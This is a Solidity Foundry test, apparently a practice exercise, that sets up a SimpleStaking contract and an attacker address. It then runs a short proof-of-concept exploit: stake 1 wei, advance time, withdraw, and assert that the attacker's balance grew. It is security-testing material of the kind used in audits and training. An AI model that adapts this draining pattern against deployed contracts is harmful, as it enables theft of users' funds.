// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import "../src/day1.sol";

contract exploit is Test {
    SimpleStaking public staking;
    address attacker = makeAddr("attacker");

    function setUp() public {
      /*    Step 1: deploy contract
            Step 2: fund contract with X ETH
            Step 3: fund attacker
            Step 4: attacker stakes 1 wei
            Step 5: warp time
            Step 6: attacker claims rewards
            Step 7: verify attacker profit 
        */
        staking = new SimpleStaking();  //deploy contract
        vm.deal(address(staking), 10 ether); //fund contract with X ETH
        vm.deal(attacker, 5 ether); //fund attacker
    }

    function testExploitRe1() public{
        uint256 before = attacker.balance;
        vm.startPrank(attacker);
        staking.stake{value: 1 wei}();

        vm.warp(block.timestamp + 10);

        //staking.claimRewards();
         staking.withdraw(1);
        vm.stopPrank();
        uint256 afterBal = attacker.balance;

        assert(afterBal > before);

        


    }
  
}
